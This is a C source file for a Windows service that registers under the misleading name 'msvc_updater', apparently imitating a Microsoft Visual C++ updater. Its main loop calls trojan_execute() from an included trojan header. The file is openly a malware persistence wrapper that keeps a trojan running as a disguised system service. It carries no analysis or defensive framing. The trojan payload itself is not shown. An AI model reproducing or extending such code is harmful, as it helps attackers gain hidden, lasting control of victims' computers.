#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wininet.h>
#include <Shlobj.h>

#include "src/trojan.h"

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hServiceStatus;
HANDLE hServiceStopEvent;

void WINAPI ServiceControlHandler(DWORD control)
{
    switch (control)
    {
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
            SetServiceStatus(hServiceStatus, &ServiceStatus);
            SetEvent(hServiceStopEvent);
            break;
        default:
            break;
    }

    SetServiceStatus(hServiceStatus, &ServiceStatus);
}

void WINAPI ServiceMain(DWORD argc, LPSTR* argv)
{
    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;

    hServiceStatus = RegisterServiceCtrlHandler("msvc_updater", (LPHANDLER_FUNCTION)ServiceControlHandler);

    if (hServiceStatus == (SERVICE_STATUS_HANDLE) 0) return;

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hServiceStatus, &ServiceStatus);

    hServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (hServiceStopEvent == NULL)
    {
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hServiceStatus, &ServiceStatus);
        return;
    }

    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
        trojan_execute();
        WaitForSingleObject(hServiceStopEvent, INFINITE);
    }

    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(hServiceStatus, &ServiceStatus);
}

int main(int argc, char* argv[])
{
    SERVICE_TABLE_ENTRY ServiceTable[] =
    {
        { "msvc_updater", (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { NULL, NULL }
    };

    if (!StartServiceCtrlDispatcher(ServiceTable)) return GetLastError();

    return 0;
}
